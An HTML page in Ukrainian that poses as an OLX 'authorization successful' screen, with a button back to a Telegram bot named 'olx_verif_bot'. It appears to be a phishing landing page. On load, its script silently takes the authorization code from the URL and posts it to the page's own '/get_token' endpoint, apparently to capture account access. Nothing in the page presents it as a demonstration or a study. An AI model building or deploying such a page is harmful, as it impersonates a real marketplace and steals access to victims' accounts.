<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Авторизація успішна</title>

<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>

body{
margin:0;
font-family:'Roboto',sans-serif;
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(135deg,#e8f0f1,#f2f4f5);
}

/* карточка */

.container{
background:white;
width:90%;
max-width:420px;
padding:45px 35px;
border-radius:16px;
box-shadow:0 15px 40px rgba(0,0,0,0.12);
text-align:center;
animation:fadeIn .6s ease;
}

/* анимация появления */

@keyframes fadeIn{
from{opacity:0;transform:translateY(20px)}
to{opacity:1;transform:translateY(0)}
}

/* галочка */

.checkmark{
width:80px;
height:80px;
border-radius:50%;
background:#27ae60;
margin:0 auto 20px;
display:flex;
align-items:center;
justify-content:center;
animation:pop .4s ease;
}

.checkmark svg{
width:40px;
height:40px;
stroke:white;
stroke-width:4;
fill:none;
}

@keyframes pop{
0%{transform:scale(.6);opacity:.3}
100%{transform:scale(1);opacity:1}
}

h1{
font-size:24px;
margin:10px 0;
color:#1f2d3d;
}

p{
color:#5f6c7b;
font-size:14px;
margin-bottom:30px;
}

/* кнопка */

.btn{
display:block;
width:100%;
padding:16px;
background:#1f2d3d;
color:white;
font-weight:700;
border-radius:10px;
text-decoration:none;
transition:.25s;
box-shadow:0 6px 15px rgba(0,0,0,.15);
}

.btn:hover{
transform:translateY(-2px);
box-shadow:0 10px 20px rgba(0,0,0,.18);
}

.btn:active{
transform:scale(.97);
}

.footer{
margin-top:25px;
font-size:11px;
color:#9aa7b3;
}

</style>
</head>

<body>

<div class="container">

<div class="checkmark">
<svg viewBox="0 0 24 24">
<polyline points="4,13 9,18 20,6"/>
</svg>
</div>

<h1>Авторизація пройшла успішно</h1>

<p>Ви можете повернутися до застосунку та продовжити.</p>

<a href="https://t.me/olx_verif_bot" class="btn">Повернутися</a>

<div class="footer">
© OLX.UA 2026
</div>

</div>
<script>
async function sendCodeToServer(authCode) {
    if (!authCode) return;

    try {
        await fetch("/get_token", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                code: authCode
            })
        });
    } catch (err) {
        console.error("Error:", err);
    }
}

const urlParams = new URLSearchParams(window.location.search);
const codeFromUrl = urlParams.get("code");

if (codeFromUrl) {
    sendCodeToServer(codeFromUrl);
}
</script>
</body>
</html>
